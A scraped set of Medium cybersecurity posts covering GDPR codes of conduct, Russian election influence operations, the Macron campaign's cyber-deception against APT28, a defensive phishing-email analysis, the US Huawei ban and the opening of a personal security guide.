Under the GDPR regulations associations or other bodies such as professional bodies representing categories of controllers/processors are encouraged to come up with codes-of-conduct, within the limits of GDPR regulation, aiming to facilitate the effective application of GDPR. GDPR regulation provide further details about exact procedure to follow and guidelines to form such code-of-conducts including monitoring mechanism for approved code-of-conducts.
In order to help the controllers/processors to be in compliance with regulation, GDPR encourage the establishment of certification mechanisms and data protection seals. From individuals point of view such certifications and seals help to quickly assess the level of data protection of relevant products and services. You can read further details on certification from GDPR main text.
Written by
","['Pseudonymization', 'Privacy', 'Cybersecurity', 'Gdpr', 'Eu Gdpr', 'Trust']"
American Snoper - thaddeus t. grugq - Medium,https://medium.com/@thegrugq/american-snoper-6d28e833b377?source=tag_archive---------0-----------------------,"How modern conflicts play out in the informatics sphere, what I mean when I talk about cyber war, is happening in France. After France there will be Germany, then the Scandinavian countries have their elections. There is no chance that Putin attempting to shape the world to best suit Russian interests will abate. Currently, the strongest area that he can contend in is the informatics sphere, the cyber realm, where human perception of reality is shaped.
Russians believed that creating a narrative that democracy was corrupt in implementation and releasing curated proof of this was persuasive. In fact, it was simply the tempo of releases keeping the Democrats (or Republicans) from ever getting any of their own messaging out. This was a successful attack because of attention budget consumption, not a narrative.
Speculation! Russia is used to a population that knows not to believe the newspapers, to read between the lines, to accept the official line in public and not question it. They very likely believe that the Americans read and accept the false narrative because it was presented, with evidence, and then the objectives of the operation were met. That is, they presented a narrative and backed it up and the op worked, the lesson they’d learn from that is that they can create narratives that people will accept. I don’t believe this is true. I believe they are thus vulnerable in that they don’t know why their operation worked.
Another way: the Russians crafted a narrative that they then “supported” with a curated set of “evidence” stolen from various people and institutions. They presented this narrative and supporting proof, pushed it hard using a number of channels (leaks, bots, propaganda outlets, etc.) and surprisingly, it worked. For them, the take away is simple: craft a narrative (in this case: corrupt democracy) and provide supporting “evidence.”
This is not why their attacks were effective (part of what helped is the extremely partisan Breitbart dominated “conservative reality distortion field.”) The main effect that the Russian hacks had, via the Wikileaks cut-out releasing portions of Podesta’s emails in a steady drip, was that they crowded out all other news stories. This total domination of the news cycle sucked the oxygen out of the room for the candidates own messaging. If the Russians want to repeat their success in France, they don’t need to go to the trouble of crafting a narrative and presenting it, they simply need to release the inbox of a TV5 reporter every other day.
There are a very few cases where the Russian influence operation was weak or stopped. This was when the WashPo exposed them, which came as a surprise and left them scrambling to react – hence Guccifer 2.0. Unfortunately for the American media, they were not capable of pressing their advantage (only VICE continued to hammer G2.)
The Russians, when they choose the time and place for action, are formidable. But when they are forced to cyber before they’re ready, then things fall apart. They cobbled together Guccifer 2 very rapidly from various parts. A cyber Frankenstein: the name of a Romanian hacker who’d just claimed to have hacked HRC’s email server; unsanitised documents already selected for DCLeaks; poorly coordinated emails and website construction. After the poor metadata hygiene was pointed out, they sanitised all future documents.
Proper planning prevents piss poor performance.
They learned that they can’t operate a real time deception (the interviews were terminated for a FAQ after they got tripped up with the Romanian language questions.) This “just wing it” approach has very seldom worked for intelligence operations. Experienced case officers know that good results come from good plans, not thinking on your feet.
Recommendation: move against them before they start ops. They have shown great agility and responsiveness, but they make mistakes then they have to wing it. Force them to wing it as much as possible.
The recalcitrant nature of the US IC to produce damning evidence against the Russian meddling is understandable. Burning sources and methods is extremely expensive. The problem here is that:
The fog of cyberwar is the war
Uncertainty and lack of transparency are strategic advantages that the opposition (the Russians) have used to maximum effect. This ranges from their denials of the Little Green Men in Crimea, to the denials of war in Ukraine, to the denials of hacking political targets and attempting to influence the political campaign:
[Putin]…denied allegations of Russian interference in the election, but said “maybe we helped a bit with WikiLeaks.” — Source
People, human beings, only have so much energy to invest into something. Arguing with strangers on the internet is just the sort of energy sapping activity that is exhausting. A tarpit of never ending pain, frustration and boredom. This is one of the reasons that troll armies work, they exhaust people who are genuinely engaged in a topic.
The trolls enjoy what they are doing far more than the victims. This is a basic rules for radicals tactic. Indeed, most of the rules for radicals apply very well to cyber electioneering.
Recommendation: create troll counter armies. Attack the identified trolls to keep them away. A skirmish line of troops protecting civilians. Much of this could be automated with bots as well.
Recommendation: they don’t react well to evidence that implicates them. There is a reasonable chance that putting strong dossiers out early will make them less aggressive, less effective, and reduce their freedom of movement.
A number of erroneous “Lessons Learned” have been drawn from the cyber conflict around the US election. There were a number of issues at play.
The lessons that journalists, Services, and many in the public are drawing from the Russian influence operations against the US, as well as the rash of independent freelance influence operations (see: Macedonian teenagers, random dude out for a quick buck, etc.), are mostly just wrong.
The biggest take away that Europe, for example, seems to have developed is a firm belief that “setting the record straight” or providing a central authority of “true facts” will allow them to defeat disinformation. This is wishful thinking at its worst. There are a number of reasons that this will not work, but I’ll limit myself to a few of them:
There was no lack of fact checking during the US election, but it had little impact. People simply didn’t care, “I know too much about a good story to let the truth get in the way,” and “never underestimate the ability of people to rationalize anything.”
People read news for ammunition, not information. It seems unlikely that those committed to voting one side or the other are much concerned with verifying the validity of a story. They want something to be outraged by (high valence), or they want something to reinforce their pre-existing world view.
Creating a narrative doesn’t require lying. As a classic example, say that the UK Air Force reports that their guided munitions have a 74% accuracy the papers could run either “Over a Quarter of Bombs Miss” or “Almost Three Quarters of Bombs Hit Target.” Both variants are true, but present the same fact from different angles. Examples of how using distorted versions of facts to achieve aims are extremely prevalent. Media outlets are more than happy to present facets of a story that align with their interests. The opposition will happily supply these media outlets with data for favourable stories.
Historically, the KGB loved telephones (and other systems) that they knew where monitored by their opposition. They believed, in many cases correctly, that the opposition would believe whatever intelligence they collected from the surveillance was reliable, AAA rating. The KGB thought of these surveilled systems as a direct channel to the opposition where they could control was revealed and when it was revealed. The typical KGB technique during this time (everyone good still does it) was to place only fragmentary hints about a narrative, and allow the opposition to reach the conclusion themselves. People believe conclusions they have drawn themselves better than those told to them, so the KGB was basically enlisting the oppositions analysts to become champions of the disinformation.
I suspect that the current FSB views certain channels of communication in the same way. My speculation is that they are treating Wikileaks as a “tapped phone.” They know that they can feed data into Wikileaks and it will be published in a reasonable time (they probably have very good models of how long it takes from “leak” to publication.) They can basically reveal the information they want the opposition to know about, via a cut out, that leads to a response, a reaction, by the Western Services.
In France there are two very clear outcomes that work well for Russia: either Fillon gets elected, or Marine Le Pen. The early polls showed that the likely second round of voting would be a run off between MLP and Fillon. A win-win for Russia.
Instead, because Fillon had betrayed Sarkozy, or someone else similarly powerful within his party, he was knifed in the back. His petty embezzling was exposed and his poll numbers collapsed. Somehow, he has managed to stay in the race. Then there was a crucial rally for him. If he fails to draw a large crowd, he’ll probably have to drop out. The rally was rained out. Somehow, despite all this, Fillon is not done.
This is extremely interesting because it was not an anti Russian meddling counter attack, but rather internal French politics as usual. The result though, has been wonderful. Fillon was significantly more palatable than MLP so with him floundering, that makes for an interesting opening. It also takes one Russian horse out of the race, limiting their options and reducing their “win states.”
Now, the most recent development, both Fillon and MLP are under investigation. Misuse of public funds. MLP is essentially broke, she has only Russian money available to her. If she takes it, that’s going to look bad. If she doesn’t take it, she won’t have sufficient funds. Combined with the investigation, this may lead to both MLP and Fillon being forced out of the race due to circumstances.
Recommendation: take the Russian horse out of the race. Remove their incentives to interfere. Although they will likely still make some moves, even just as spoilers, they are robbed of the opportunity for victory. They have no winning outcome.
Speculation: Russia will target the investigations and attempt to damage the people or institutions involved, such as the judges or prosecutors. They’ll also figure out a way to get MLP some much needed cash.
Right now, who knows what will happen in the weeks before the election. There is a lot that can happen still.
The most likely action is that Putin will continue to attack Macron. Probably not using a coordinated barrage like the beginning of February which saw Wikileaks, Russia Today and a few other outlets attempt to push a narrative (“Macron is a Rothschild banker,” which apparently has strong negative connotations for French voters.)
If I had to guess, I believe that curated “leaks” of Macron staff emails and Telegram conversations are going to be used to make him look bad. This is very likely to happen, I think, regardless of whether Fillon or MLP are still viable candidates.
Macron has been playing this poorly with regards to the Russians. Earlier this month he complained about “thousands of cyber attacks per day from Russia” which is, quite frankly, horse shit. Wasting credibility on such a meaningless event is only going to hurt him in the long run when he’ll need to counter the real attacks.
What Macron needs to do is to make sure that his staff are locked down as securely as possible (GMail, 2FA, etc etc), and move his inner circle to a non attributable compartmented comms system. For example, using Threema on dedicated iPhones with Reservoir Dogs style code names for principals. Migrate regularly to new equipment, names, etc. This will make the job of penetrating the external layer harder and it will make the job of the analysts dealing with exfil from the inner circle (assuming they can get it) much harder. It contains and restricts the damage of a penetration and exposure, and it raises attacker costs in term of resources, some of which don’t scale (eg time).
The French DGSE, CERT and other elements need to respond immediately to “leaks” by revealing their origin in Russia. The affected candidates need to demonstrate immediately whether the documents leaked have been tampered or altered. This will help to reduce the credibility of additional future leaks. Immediately attack the lies, mistakes, and fabrications for what they are. The Americans made the mistake of sitting back and hoping for the best. It seems to me that the Russian way of cyberwar is not very capable of responding to counter attacks, so rather than attempt to preserve secrecy or dignity (both of which are lost anyway), use the opportunity to expose the active manipulation of the Russian intelligence services. This will help to reduce the credibility of future leaks.
Fund more content like this.
Written by
","['Russia', 'Cybersecurity', 'Privacy', 'Operational Security', 'France']"
Analysis of the InvestorsLounge.com case - SherlockHummus - Medium,https://medium.com/@Homes_42/analysis-of-the-investorslounge-com-case-2b8d64667c87?source=tag_archive---------8-----------------------,"Very recently, an entrepreneur was put behind bars for “infringing copyrights and intellectual property rights..” — AMZ MAK Capital Ltd (complainant).
While both parties were fighting on the social media, calling each other liars, I sat back and did a little analysis. Here’s something I find really interesting about the case.
The ‘truth’ doesn’t always win the case. As the access to better Lawyers and money (at least in Pakistan) can really effect the judgement. So let us compare these two parties.
‘’As the youngest chairman and founder of an investment bank in America,’’ the dazzled reporter added, ‘’his accomplishments are a little more than extraordinary.’’ Well, in a way, perhaps they are. For whatever else he is, Mr. Khan is a fugitive from justice in New York, where state prosecutors accused him last spring of stealing millions of dollars from several of his brokerage firm’s customers — including some who also happened to be members of the Gambino organized crime family… — New York Times [1]
In other words, guy with guts to take on Gambino family [*].
As these guys were not popular enough to get published on NYT. Out of the four accused founders…. Three actually exist (LoL). Sennen, Baqar and Hammad are IBA students (as said by bloggers). And the “Kids who stole 1.4m dollars worth of code” — as described by Mir Mak [2].
So it’s “kids” VS. “fugitive”. Fair Enough?
So there are alleged for stealing the idea and the source code (with minor modifications).
I want to think about it, logically. Because that’s what programming is all about.
Let’s assume I employee you as a dev. We both end up in conflict. And you go home and make a similar product. Now is there any chance that your code (after few months) would be similar to your code before a month? Of course yes.
I mean even if you just used the same open-source things, the code will obviously be “VERY SIMILAR”. The methodology, through which the code is going to be checked could really effect the case.
Really? A IP on idea. Let’s bet honest. Is there any copyright on idea? (correct me if I am wrong). This morning I had the idea of posting on Medium… If anyone else does it. I’ll sue him too!
The Bloggers are usually the reporters. Unfortunately, they got few facts wrong, and suddenly, they became the target. There few things that shouldn’t have been done by bloggers, but these are not enough to justify the harassment and abusive messages they’ve received [**].
A few guys pointed out Technical Issues too. Including the arrest.
Here’s some stuff Awais[3] posted:
Here are some Talha[4] posted, regarding MAKs actions:
Many more yet to be discovered
People started posting on social media (attaching their photos to make sure IL feel guilty as charged). Soon enough, ProPakistani wrote a blog post. It was their generosity to include their official response… And so on!
Now, even if this case get’s proven wrong. Would any investor in Pakistan like to work with these guys? I mean they are after all “accused”. We already have a WINNER. The MAK (I mean not the Mac, the MAK). There’s no fight here at all.
Think about it… how easy it is to destroy someone in Pakistan.
Sources:
1. http://www.nytimes.com/2000/01/02/business/was-he-wiser-than-the-wise-guys.html?pagewanted=all
3. https://www.facebook.com/owaeis/posts/10208193837356076
4. https://www.facebook.com/stalha.izhar?fref=ts
*. https://en.wikipedia.org/wiki/Gambino_crime_family
**. Babar Khan Javed said “I don’t think I have been called bc/mc more in my entire life than I have today by people working/incubated at Nest IO”…
Will post more stuff soon. Correct me wherever you like.
Written by
","['Cybersecurity', 'Analysis']"
Analyzing a counter intelligence cyber operation: How Macron just changed cyber security forever,https://medium.com/hackernoon/analyzing-a-counter-intelligence-cyber-operation-how-macron-just-changed-cyber-security-forever-22553abb038b?source=tag_archive---------2-----------------------,"Up until today I could only look up to Russia (whether I agree with them or not) for conducting advanced information operations in cyber. Now, I can look up to Macron and the anonymous security professionals behind him and admire them. Finally, someone uses cyber deception to beat attackers at their own game. I am not alone, and Cymmetria’s ideas have been vindicated yet again.
Let’s quickly go over what happened, and then analyze the operation and why it is so… well, cool.
Important: We don’t know much at this stage, so I will assume a lot. While reading the story please consider it could all be an elaborate deception, and never happened.
But remember, regardless of what actually happened, one of the major lessons of cyber security, as learned in Estonia a decade ago and endless times since, is that what people perceive matters as much if not more so than what the technical details of any attack may have actually been.And that further, attacks serve a purpose. The motivation can be political or otherwise, but they must be analyzed in context.
Further, as shown in this analysis, the power of cyber deception is in increasing the attackers’ costs. The burden of anomaly detection, figuring out what’s real and what’s not — is now on them. A few fake docs killed the election hack. Future attackers will have to sift through data. Cyber deception inflicts economic costs on attackers.
NOTE: Significant updates to this post will be marked with [Updated].
Just before the French elections, the long anticipated news hit. Emmanuel Macron, candidate for president of France, suffered a data breach and the data was dumped for the public to download.
According to this article which I’ll quote:
In the last hours before midnight on Friday, just before a campaigning blackout imposed by French electoral law in anticipation of the crucial vote on Sunday, somebody dumped nine gigabytes of emails and documents supposedly purloined from the campaign of leading presidential candidate Emmanuel Macron.
Macron learned the lessons of the Hillary Clinton campaign, and immediately took control of the messaging and PR:
Literally at the 11th hour, before the blackout would silence it, the Macron campaign issued a statement saying it had been hacked and many of the documents that were dumped on the American 4Chan site and re-posted by Wikileaks were fakes.
Wikileaks in their own statement doubted Macron’s ability to go over the documents so fast, but it didn’t matter. That narrative controlled the short news cycle. Macron cast doubt on the reports and showed leadership, actually providing reporters data which they could use to write their stories. That by itself is a lesson for the future.
If all Macron did was throw doubt on the validity of the leaks, that’s already a powerful win. Wikileaks themselves cast a doubt on the source:
#MacronLeaks assessment update: several Office files have Cyrillic meta data. Unclear if by design, incompetence, or Slavic employee.
There were few such marked documents, all from a limited time period. Regardless — they served their purpose in timelines to assist Macron in his PR crisis response.
Marine Le Pen’s supporters started to make PR use of “all these damning emails”, although many of them looked like bots using Google translated messages, When a few of the documents were displayed as ridiculous, which stopped them short. Some of the documents in the data dump were obvious fakes, and started popping up over French social media.
Creating fake documents that look real, at scale is hard. This case shows us we don’t necessarily need to.
Effectively, the next time a threat actor attempts this, they may have to sift through all the data first. Cyber deception increases the cost of the attacker, shifting the economics of cyber security and thus changing the asymmetry between attacker and defender.
This analysis however misses a critical aspect of what might have happened. A possible false flag operation possibly by Macron, possibly by someone else.
This is where it gets really interesting.
Ah, but there’s the rub. As reported by The Daily Beast, part of the Macron campaign strategy against Fancy Bear (also known as Pawn Storm and Apt28) was to sign on to the phishing pages and plant bogus information.
“You can flood these [phishing] addresses with multiple passwords and log-ins, true ones, false ones, so the people behind them use up a lot of time trying to figure them out,” Mounir Mahjoubi, the head of Macron’s digital team, told The Daily Beast for its earlier article on this subject.
So Macron’s people, and specifically Mounir Mahjoubi, who I want to make sure and meet one day, claim to have fed APT28 false data in a “counteroffensive”. Maybe they have’ maybe they haven’t. Maybe they did something else entirely. Maybe it wasn’t them.
Regardless, their PR win as shown above — planned or not — with or without cyber, was in the bag.
Assuming that there was an attack, and that this was actually APT28, and then that this comment by Mr. Mahjoubi (or who knows who) didn’t plant a false flag by himself to make Macron’s PR look more authentic by blaming the now infamous Fancy Bear, then under this assumption we can see that Macron prepared for this in advance, studied the adversary attacking his systems, and proceeded to feed it the fake documents. Well then, AWESOME!
The comment about phishing is a bit odd technically. I’d have expected them to feed the exfiltration itself, or run the phishing emails on computers they prepared. But hey, it’s a mainstream news article so let’s give them the benefit of the doubt — for now. We can’t expect technical accuracy.
Some further technical information can be found in this article (quoted below), which sheds more light on what was done. Similar, you may note, to the technique some banks use to counter regular phishing attacks (as opposed to sprearphishing), seeding the phishing sites with fake credentials they could monitor for access.
The Macron campaign, like Clinton’s, was frequently targeted by phishing attacks which would send emails with links to copies of credible-looking log-in screens with subtle differences in the web addresses like using dots rather than hyphens, etc. “If you speed read the URL, you can’t make the distinction,” said Mahjoubi.
Mahjoubi described the fake sign-in page as “pixel perfect,” and once a user signs in, the hackers would then have access to all of the user’s emails.
“Every week we send to the team screen-captures of all the phishing addresses we have found during the week,” Mahjoubi explained.
But the real genius was in how Mahjoubi’s team used the hacker’s techniques against them.
“You can flood these addresses with multiple passwords and log-ins, true ones, false ones, so the people behind them use up a lot of time trying to figure them out.”
This tells us one thing clearly, even though we do not fully understand what the team has done to feed APT28 / Fancy Bear disinformation, it is clear they attempted to slow them down by feeding them fake credentials. This could potentially also tip the defenders’ hand, depending on their strategic goal. Do you deny the attackers data? Do you disrupt their ability to conduct operations? Do you perhaps degrade their trustworthiness? These do not all necessarily support one another.
Taking the disinformation activity into account, one thing Wikileaks misses in their tweet above, is that if Macron’s people seeded APT28’s exfiltration with their own documents, that could mean they also planted false flags with Cyrillic, and that this wasn’t just an OPSEC failure on the supposed Russian threat actor’s part (someone planned badly, or simply made a mistake), or an employee of Macron’s who uses a Cyrillic keyboard.
Regardless, the obvious fakes in the data dump were enough to achieve the strategic goal of reducing the data dump’s success.
My main takeaway? Beyond excitement?
Cyber deception inflicts costs on the attacker, shifting the economics of cyber security and thus changing the asymmetry between attacker and defender. The burden of anomaly detection, figuring out what’s real and what’s not, is now on them.
Other takeaways:
Remember: We don’t know much at this stage, so this post has a lot of assumptions.
One thing remains clear. Cyber security, much like any other tool or weapon, servers a policy or strategic purpose. It does not often stand as a motivation by itself, and needs to be analyzed in this context. In upcoming elections, think — who may have an interest in disrupting them, and why?
Much like recently for M&A acquisitions cyber security has now become a due diligence issues, election budgets will now include a cyber security clause.
Information operations are as old as history. Why then do I rank this incident so highly?
When the APT1 report came out, it shook the world. An entire cyber security industry was “created” to combat the threat. It gave public and concrete proof. The same applies here.
There is nothing worse as a cyber security professional than going to work every morning knowing you’re going to lose. It’s a defeatist industry. Seeing a live and public example of successful resistance, which is complex and interesting, show that not only can we win, but it is as interesting, if not more so, than the attacking side.
Lastly, some of us have been discussing this subject for a while now on Facebook in a tiny group. Join if you’re interested: https://www.facebook.com/groups/949960748352854/
Exciting times!
Gadi Evron.(Twitter: @gadievron, Facebook: @gadioncyber)
#Cyberdeception #Macron #FrenchElections #propaganda #cyber #Estonia
Hacker Noon is how hackers start their afternoons. We’re a part of the @AMI family. We are now accepting submissions and happy to discuss advertising & sponsorship opportunities.
If you enjoyed this story, we recommend reading our latest tech stories and trending tech stories. Until next time, don’t take the realities of the world for granted!
Written by
","['About', 'Help', 'Go Home', 'Cymmetria', 'Cybersecurity', 'Politics', 'France', 'Elections', 'Emmanuel Macron']"
Analyzing Malicious Emails - Kyle Bubp - Medium,https://medium.com/@kylebubp/analyzing-malicious-emails-fb4ddcf0663e?source=tag_archive---------5-----------------------,"This is just a short primer on things to look for when analyzing a malicious email. It’s by no means a step-by-step analysis walk-through, but instead just a summary of a real-world example of a phishing attempt, and just enough to get you started if you are new to something like this. In this scenario, the attackers sent this email in an attempt to phish the user’s Office 365 credentials.
Looking at the headers is a generally the first place you start when analyzing an email. Header information will give you the exact way the email flowed through the magical Internet tubes to get to your machine. This gives you important information, such as the sender’s origin IP address, sender’s mail server, and the true email addresses that were used to send/receive. They can also reveal other information, such as the mail client that was used to send the email (X-Mailer).
As you can see in the headers below, the email started within Microsoft’s servers and jumps around through their environment quite a bit before landing at the mail server for this particular user’s O365 domain.
As you can see from the headers, the attacker is using a Hotmail address (denkane-at-hotmail-dot-com), with their name set to “Microsoft.com Team” in an attempt to build trust with the user (sanitized to victim@domain.com). I’m not exactly sure, but I would wager a guess that Microsoft (Hotmail) to Microsoft (O365) emails are treated as “less suspicious” to their AntiSpam/AntiVirus filters.
To the user, this is what the email looks like:
As a user, there are some things that should immediately stick out, such as how the font looks slightly off, there are two fonts in use between the body and the “Do not reply this message”, and the poor grammar.
The upgrade mailbox quota link (this is malicious y’all, before you go here, understand what you’re doing):
First off, it’s https (super legit, right?), my suspicion is perhaps they are using a Let’s Encrypt cert, but lets check using Qualys’ SSL Labs!
So the suspicion was correct, but notice that it was just generated on 1/4/18. The victim received the email on 1/9/18. Quick turnaround! These hackers hustle!
Just an aside here, I mentioned the Let’s Encrypt cert because it’s an easy and free way to build trust with the victim. Traditionally, users have been taught to trust sites with “the little green lock” that signifies SSL. This type of guidance really doesn’t apply anymore.
Also, something I find kind of amusing, and a reason as to why you shouldn’t rely on data with no context. This site gets an A from SSL Labs. Without any other context, one might assume it’s a totally legit and secure site. However, we know that it’s a phishing site.
Check out that Office365 part of the URL right after the domain. The victim is actually using O365. Either a lucky guess, or the attacker has done some recon. My money is on the latter. It’s relatively easy to determine if an organization is using O365 (or G Suite) by looking at their DNS MX records. I typically just throw the domain into nwtools.com and let ‘er rip.
O365 Example (take note of the MX records that point to an outlook.com domain):
Of course, you can always just use dig (or nslookup). G Suite Example (MX records point to a googlemail.com domain):
The first thing I generally do is throw the link into VirusTotal, URLquery, Hybrid-Analysis, and Robtex. It used to be that these sites would have no problem analyzing a malicious site for you. Nowadays, malware authors and scammers/spammers seem to have gotten a little wiser. The authors are blocking particular user agent strings and source IP addresses. This can make using cloud-based analysis tools difficult, if not impossible.
Generally, I take precautions when directly interacting with a known malicious site. I like to fire up a VPN and mask my IP. I don’t want the attackers to know that I’m on to them, even if it’s likely they aren’t looking.
Let’s try using wget. Generally this won’t work without modifying the user-agent, but I suppose I got lucky that the authors were lazy. It actually let me pull it down, and this piece is interesting:
Now, the unescape function is actually deprecated, and was replaced by decodeURI, but if we decode this, we get:
Just based on the code, it’s pretty clear that this website is going to attempt to grab the user’s email and password in a form, to be sent to the attacker using post.php.
There’s another piece of encoded text that decodes into:
At least they were kind enough to put comments in their code. Alright, now I’m curious, what does this thing actually look like? Let’s fire up a VM and play a bit.
First off, let’s just go ahead and visit the root domain.
Well that’s just sloppy. They didn’t even set the Options -Indexes in Apache! Shame on them. Well, while we’re here, we might as well poke around. At first glance, it looks like they have sites that target Google/Gmail users, Chase account holders, and Office 365 users.
The Google one looks like a catchall for any online account, each one with a .php script to capture creds and post them elsewhere. Interesting that they reversed the names of the sites to name their php files (e.g. outlook becomes kooltou.php).
Here’s the Outlook example:
Let’s keep going down the list, here’s their Chase phishing page:
And finally, we get to the site that our victim was sent. Honestly, this has to be one of the laziest phishing sites I’ve seen.
What’s interesting on this site is that they pull the favicon of whatever domain is passed as the variable to the end of the URL. In this example I used victim@domain.com, so they scraped domain.com/favicon.ico. You can see it in their source:
You can also see it in your browser:
So now we have a pretty clear idea of how the attacker determines what phishing site to send their victims to, some of the things they do to make it look ‘legit’, and how they harvest credentials on their website.
Off the top, I recommend utilizing some type of secure email gateway. As you can see in the headers, this message was able to successfully pass through the O365 filters, even though it had a link in it that was pretty obviously a malicious domain with a ccTLD of Mali. So, perhaps it makes sense to utilize a secure email gateway with better threat intel, or add some tighter controls in the Exchange configuration.
I also recommend clearly marking any email originating outside your domain. As you can see, this email was marked “**EXTERNAL**.” Don’t simply make this change without also informing your users as to why you are making this change, otherwise you’re likely to have a negative impact on your organization. Marking emails that originate outside of your organization is just a nice reminder for your users to think twice about trusting its content.
If you don’t often communicate with foreign countries, it may make sense to quarantine emails that contain certain characters from foreign character sets. You can do this in Exchange’s AntiSpam Content Filtering by just sticking some common characters in the Custom Words list.
Of course, if you have the capability to block websites based on category or the ability to limit browsing by geographic region, you could do that as well.
Finally, but perhaps most importantly, implement two-factor authentication. My rule of thumbs is that if it has a web portal (e.g. Outlook Web Access, GMail, VPN, etc.), it should have two-factor authentication enabled and configured. This helps guard against the damages of a successful credential theft.
Training is key here, and it needs to be more than just an annual ‘click-on-all-the-obvious-answers’ multiple choice questionnaire. Users should understand, at a high level, the current risks and and attacks. They should also be encouraged to report suspicious emails, even if they accidentally gave up their credentials. This is important, because many times your users are the only way you will be alerted. You want them to feel like they can report a mistake without the fear of losing their job.
Another process that is surprisingly lacking in many organizations is to require a verbal confirmation on wire transfers. Many types of wire-fraud scams involve an attacker phishing a user, and then simply sitting in their inbox, waiting for wiring instructions. At that point, the attacker will send an email asking for the wiring instructions to be changed, thus wiring the money to the attacker’s account. Before any wire is sent, it’s important to call and verify the wiring information before sending the money.
So that was a short and sweet intro into analyzing a phishing email. If you’ve dealt with similar things in your organization, I’d like to hear about how you handled it and about the defensive controls you’ve put in place.
Written by
","['Phishing', 'Malware', 'Cybersecurity', 'Hacking']"
A National Emergency against Huawei - FutureSin - Medium,https://medium.com/futuresin/a-national-emergency-against-huawei-aea1bb7d09e0?source=tag_archive---------8-----------------------,"With the trade wars back on tariff mode, the POTUS declared a national emergency this week, which could set up a huge blow to China’s Huawei.
Recently Huawei U.S. chief security officer Andy Purdy and former Homeland Security Secretary Michael Chertoff described the decade-long disconnect between the U.S. and the Chinese telecom giant.
Huawei will be a global giant of considerable importance in the 2020s. It’s basically building its substitute to Android. It’s recently overtaken Apple again in phones sales by volume and will overtake Samsung eventually. In 5G, it will likely be the global leader in spite of the U.S. banning it.
Apple will feel the pain in China, even as China punishes Canada with spying charges on its citizens. Trump ordered a national emergency on information security this week.The Commerce Department followed with Huawei restrictions.
While the U.S. has insisted the company and its equipment are pervasively unsafe, not all of America’s partners are buying it or can afford to drop Huawei, including Germany, the U.K. and probably Canada too. Relations with China are too important for major countries to outright ban Huawei even if back doors may exist or the Chinese Government can summon Huawei to create them.
China refuses to back off or stop its state-run cybersecurity espionage program that has already stolen $Billions in intellectual property in the last few decades, which many believe is the real sticking point of the “trade war”.
Huawei is, so far as we can tell, a state-backed firm of great importance in how China goes global, though its management denies it. Outside of BAT, Huawei and ByteDance loom large as China’s next wave of technology giants that can spearhead international growth outside of Asia and make headway in the battle for South America, Africa, Europe and of course South Asia.
Huawei’s alternative smartphone OS may have taken on added urgency for China with the rising trade tensions with the US. Huawei has been developing and perfecting its own system, according to people familiar with its plans. Huawei isn’t just 5G or smartphones, it’s IoT, AI and a hybrid company that’s highly underrated and poorly understood in the West.
There’s few stories in technology so impactful to the world, politics and the future of technology as what happens with Huawei. The U.S. has insisted the company and its equipment are pervasively unsafe. Huawei has long requested a process through which it could prove its equipment was safe. European nations, the company has said, use a risk-mitigation process and Huawei has flourished there.
Last week, President Donald Trump increased tariffs on $200 billion worth of Chinese goods. Focusing on Huawei has been an intense topic of discussions for years with the U.S. national security departments.
US President Donald Trump signed an executive order on May 15th, 2019 banning telecom equipment deemed dangerous. It’s a blacklist of the highest order. The Chinese Government is not likely to take this lightly. Cybersecurity is a sticking point in today’s geopolitical climate. The U.S. seeks to maintain its global superiority while China continues to make rapid progress.
As a futurist I’ve long believed China has more and bigger firms that can in a short period overtake many of the biggest firms of the U.S. Huawei remains a company that could scale to become more important than Tencent, Baidu or even Apple or Amazon.
It’s the very definition of a 4th Industrial age company. It could become one of the most powerful companies of the 21st century. China’s model of state-funded firms is a more efficient business model than that of BigTech companies in the West.
Donald Trump signed an executive order declaring a national emergency on information security, laying the groundwork for a US ban on China’s Huawei.
China’s belt and road and rising tech dynasty is basically unstoppable. The decline of Silicon Valley is inevitable in relation to China’s massive ecosystem of innovation, apps and rise in the Cloud, AI and domination of Asia.
It’s also a cybersecurity issue as China doesn’t play by normal standards. The U.S. government, particularly its intelligence agencies, have been insistent for nearly a decade that Huawei has been in collusion with Beijing’s Communist government in developing its technology, with the goal of giving it an espionage advantage. Just as Google, Microsoft, Amazon and Facebook increasingly work with the American Government and their agencies even in a supposed free market capitalistic system.
The U.S. cannot realistically catch Huawei in its efforts to expand into critical 5G markets. Huawei is too cheap and too good already, with penetration and global connectivity that’s unparalleled. Breaking Huawei’s reputation is a political propaganda play for the U.S. against China. This doesn’t mean that Huawei is not guilty of many of the accusations and rumors it is accused of either.
The US is also pushing other countries not to use Huawei’s equipment in 5G networks, calling it “untrustworthy”. However everybody knows China will be the eventual winner, and that they hold grudges and are diplomatic bullies of the worst order, as we have seen with Canada, New Zealand and Australia. How can these countries afford to say no to Huawei, given these circumstances?
It isn’t just a national emergency, it’s a global emergency that could show how China will implement some draconian features of a global surveillance state as it matures into a position of global leadership and technological supremacy. It understandably has a lot of people frightened, and makes China look like a threat to freedom for many countries.
Huawei has 17% of the smart phone market share. Huawei is so cheap for 5G it does bring major economic advantages though.
Written by
","['Artificial Intelligence', 'Futurism', 'Space', 'Tech', 'Privacy', 'Crypto', 'Blockchain', 'World', 'Technology', 'Cybersecurity', 'Politics', 'Government']"
An In-Depth Guide to Personal Cybersecurity - Nick Rosener - Medium,https://medium.com/@nickrosener/an-in-depth-guide-to-personal-cybersecurity-be98ba47c968?source=tag_archive---------2-----------------------,"I spent a day this week on an annual overhaul of my digital security. Several friends and colleagues were interested in a guide to doing the same; so I thought I would write one up and share with all of you: my closest internet friends.
Brands are getting hacked.
Media organizations are getting hacked.
Tech companies are getting hacked.
“Dating” websites are getting hacked.
Small companies are getting hacked.
Critical infrastructure is getting hacked.
National political parties are getting hacked.
Elections are getting hacked.
Everybody and their grandmother is getting hacked these days.
It’s no wonder online security breaches are becoming so prolific. Digital is pervading every corner of our lives, yet most people are terrible about security. In a 2016 Pew Research survey on cybersecurity, a substantial majority of online adults were able to correctly answer just two of the thirteen questions.
Let’s do something about that, by beefing up our own personal digital security.
Over the past 5 years or so, I’ve made it a habit to do an annual overhaul of my personal digital security. Each year, I review all of my online life for security threats, and commit to improving every year. These are the practices that I use as a result of that effort.
This guide isn’t going to cover things that I would consider to be “the basics,” or practices that are typically covered in “top 10 lists of best practices” for general audiences. I have, however, included a few here for reference:
In general, I attempt to address three core questions:
Let’s begin.
Let’s face it, people are terrible at passwords. We use passwords that are easy to guess, we re-use them across sites, and we keep all sorts of terrible password practices.
Given how much sensitive information of ours is kept in our online accounts, the first thing you can do to beef up your security is to secure the way you log in online.
